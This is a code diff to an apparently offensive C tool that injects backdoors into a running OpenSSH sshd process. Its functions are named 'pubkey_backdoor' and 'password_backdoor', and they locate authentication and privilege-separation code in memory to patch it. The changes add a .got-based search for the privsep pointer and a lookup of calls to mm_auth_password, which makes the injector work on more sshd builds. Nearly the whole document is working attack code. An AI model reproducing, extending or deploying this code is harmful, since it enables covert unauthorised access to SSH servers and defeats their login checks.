@@ -19,10 +19,16 @@ extern u8 *evil_hook;
 extern u64 evil_hook_size;
 
 u8 *dynsym, *dynstr;
+u64 dynsym_base, dynstr_base;
 int dynsym_sz, dynstr_sz;
 
 u8 *symtab, *strtab;
+u64 symtab_base, strtab_base;
 int symtab_sz, strtab_sz;
+
+u8 *got;
+u64 got_base;
+int got_sz;
 
 u64 resolve_symbol_tab(inject_ctx *ctx, char *name) {
 	u64 sym;
@@ -158,7 +164,7 @@ void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
 void password_backdoor(inject_ctx *ctx) {
 	u8 privsep_jnz[2]={0,0};
 
-	u64 use_privsep=0, logit_passchange=0, privsep_lea=0, privsep_test=0;
+	u64 use_privsep=0, logit_passchange=0, privsep_load=0, privsep_test=0;
 	u64 auth_password=0, mm_auth_password=0;
 	u64 *auth_password_calls = NULL, *mm_auth_password_calls = NULL;
 	int i, n_auth_password_calls, n_mm_auth_password_calls;
@@ -175,12 +181,36 @@ void password_backdoor(inject_ctx *ctx) {
 		ctx, LEA_RDI, "password change not supported"
 	);
 
-	info("logit(\"password change..\") = 0x%llx", logit_passchange);
+	info("logit(\"password change..\")\t= 0x%llx", logit_passchange);
 
-	privsep_lea = find_prev_lea(ctx, LEA_RAX, logit_passchange, use_privsep);
-	info("lea rax, privsep\t\t= 0x%llx", privsep_lea);
+	privsep_load = find_prev_load(ctx, LOAD_LEA, LEA_RAX, logit_passchange, use_privsep);
+	
+	// load instruction wasn't a lea, search for mov rax, privsep_ptr
+	if (privsep_load == 0) {
+		u64 privsep_ptr = 0x0, *ptr = (u64 *)got;
+		int i;
+		
+		// loop over all pointers in the .got
+		for (i = 0; i < (got_sz / sizeof(u64)); i++) {
+			// find the entry that points to use_privsep
+			if (ptr[i] == (use_privsep - ctx->elf_base)) {
+				privsep_ptr = ctx->elf_base + got_base + (i * sizeof(u64));
+				break;				
+			}
+		}
+	
+		if (privsep_ptr == 0)
+			error("could not find privsep.");
+	
+		privsep_load = find_prev_load(ctx, LOAD_MOV, LEA_RAX, 
+									 logit_passchange, privsep_ptr);
+									 
+		info("mov rax, privsep_ptr\t= 0x%llx", privsep_load);
+	} else {
+		info("lea rax, privsep\t\t= 0x%llx", privsep_load);
+	}
 
-	privsep_test = find_next_opcode(ctx, privsep_lea, (u8*)"\x85\xc0", 2);
+	privsep_test = find_next_opcode(ctx, privsep_load, (u8*)"\x85\xc0", 2);
 	info("privsep test\t\t= 0x%llx", privsep_test);
 
 	_peek(ctx->pid, privsep_test+2, privsep_jnz, 2);
@@ -197,14 +227,23 @@ void password_backdoor(inject_ctx *ctx) {
 	info("mm_auth_password\t\t= 0x%llx", mm_auth_password);
 	
 	n_auth_password_calls = find_calls(auth_password_calls, auth_password);
+	n_mm_auth_password_calls = find_calls(mm_auth_password_calls, mm_auth_password);
 	
 	if (n_auth_password_calls == 0)
 		error("No calls to auth_password found.");
+	
+	if (n_mm_auth_password_calls == 0)
+		error("No calls to mm_auth_password found.");
 	
 	for (i = 0; i < n_auth_password_calls; i++) {
 		info("call to auth_password @ 0x%llx", auth_password_calls[i]);
 	}
 	
+	for (i = 0; i < n_mm_auth_password_calls; i++) {
+		info("call to mm_auth_password @ 0x%llx", mm_auth_password_calls[i]);
+	}
+	
+	free(mm_auth_password_calls);
 	free(auth_password_calls);
 }
 
@@ -241,14 +280,16 @@ int main(int argc, char *argv[]) {
 
 	// locate syscall instruction
 	ctx->sc_addr = find_sig_mem(ctx, (u8*)"\x0f\x05", 2, MEM_R | MEM_X);
-	info("syscall\t\t= \x1b[37m0x%lx", ctx->sc_addr);
+	info("syscall\t\t\t= \x1b[37m0x%lx", ctx->sc_addr);
 
 	// load symtabs
-	dynsym_sz = get_section(sshd_path, ".dynsym", &dynsym);
-	dynstr_sz = get_section(sshd_path, ".dynstr", &dynstr);
+	dynsym_sz = get_section(sshd_path, ".dynsym", &dynsym, &dynsym_base);
+	dynstr_sz = get_section(sshd_path, ".dynstr", &dynstr, &dynstr_base);
 
-	symtab_sz = get_section(sshd_path, ".symtab", &symtab);
-	strtab_sz = get_section(sshd_path, ".strtab", &strtab);
+	symtab_sz = get_section(sshd_path, ".symtab", &symtab, &symtab_base);
+	strtab_sz = get_section(sshd_path, ".strtab", &strtab, &strtab_base);
+	
+	got_sz 	  = get_section(sshd_path, ".got", &got, &got_base);
 
 	// find rexec_flag
 	rexec_flag = resolve_symbol_tab(ctx, "rexec_flag");
@@ -273,7 +314,7 @@ int main(int argc, char *argv[]) {
 		rexec_flag = rexec_test + rexec_flag_offset;
 	}
 
-	info("rexec_flag\t\t= 0x%lx", rexec_flag); 
+	info("rexec_flag\t\t\t= 0x%lx", rexec_flag); 
 
 	cache_calltable(ctx);
 
@@ -292,6 +333,7 @@ int main(int argc, char *argv[]) {
 	free(dynstr);
 	free(symtab);
 	free(strtab);
+	free(got);
 	//free(my_homies);
 	return 0;
 }
